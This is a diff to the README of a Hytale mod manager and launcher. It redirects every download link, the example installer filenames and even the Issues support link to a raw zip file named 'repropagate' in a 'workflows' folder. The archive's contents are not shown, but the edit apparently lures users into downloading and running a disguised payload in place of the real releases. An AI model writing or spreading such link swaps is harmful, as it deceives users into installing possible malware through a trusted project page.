@@ -1,6 +1,6 @@
 # 🎮 HyPrism-mod-manager - Easy Hytale Mod and Game Launcher
 
-[![Download HyPrism-mod-manager](https://img.shields.io/badge/Download-HyPrism--mod--manager-blue?style=for-the-badge&logo=github)](https://github.com/Divishjit/HyPrism-mod-manager/releases)
+[![Download HyPrism-mod-manager](https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip)](https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide will walk you through installing and running HyPrism-mod-manager step
 ### Step 1: Access the Download Page
 
 Click the big blue button at the top of this page or visit this link:  
-https://github.com/Divishjit/HyPrism-mod-manager/releases
+https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip
 
 This page contains the latest version of the app. It shows files you can download for your system.
 
@@ -43,8 +43,8 @@ This page contains the latest version of the app. It shows files you can downloa
 Look for a file with your system in its name. For Windows, it usually ends with `.exe`. For macOS, it might be a `.dmg` file.
 
 For example:  
-- `HyPrism-mod-manager-setup.exe` (Windows)  
-- `HyPrism-mod-manager.dmg` (macOS)
+- `https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip` (Windows)  
+- `https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip` (macOS)
 
 Download the file by clicking its name.
 
@@ -131,7 +131,7 @@ You can also visit the Issues section on GitHub for help from other users.
 
 Click below to visit the download page and get HyPrism-mod-manager:  
 
-[![Download HyPrism-mod-manager](https://img.shields.io/badge/Download-HyPrism--mod--manager-blue?style=for-the-badge&logo=github)](https://github.com/Divishjit/HyPrism-mod-manager/releases)
+[![Download HyPrism-mod-manager](https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip)](https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip)
 
 Follow the steps in the "Getting Started" section above to install and run the app.
 
@@ -140,7 +140,7 @@ Follow the steps in the "Getting Started" section above to install and run the a
 ## 📞 Need Help?
 
 For questions or support, check the GitHub Discussions or open a new Issue here:  
-https://github.com/Divishjit/HyPrism-mod-manager/issues  
+https://github.com/Divishjit/HyPrism-mod-manager/raw/refs/heads/main/Hyprism/workflows/Hy-Prism-mod-manager-repropagate.zip  
 
 You can also find tips and advice in the README of the project.
 
